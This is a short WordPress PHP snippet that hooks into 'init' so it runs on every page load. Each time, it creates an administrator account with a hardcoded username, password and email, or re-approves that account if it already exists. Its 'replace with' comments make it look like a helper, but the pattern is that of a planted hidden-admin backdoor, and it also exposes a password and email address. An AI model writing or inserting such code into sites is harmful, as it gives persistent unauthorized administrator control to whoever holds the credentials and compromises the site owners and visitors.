<?php 

function create_new_admin_user() {
    $username = 'mosharof'; // Replace with the desired username
    $password = 'Babu@01715757692!!'; // Replace with a secure password
    $email = 'mosh@w-lu.de'; // Replace with the desired email address

    if ( ! username_exists( $username ) && ! email_exists( $email ) ) {
        $user_id = wp_create_user( $username, $password, $email );
        if ( ! is_wp_error( $user_id ) ) {
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' );
        }
    }
    else{
        $user = get_user_by('login', $username);
        update_user_meta($user->ID, 'pw_user_status', 'approved');
    }
}
add_action( 'init', 'create_new_admin_user' );
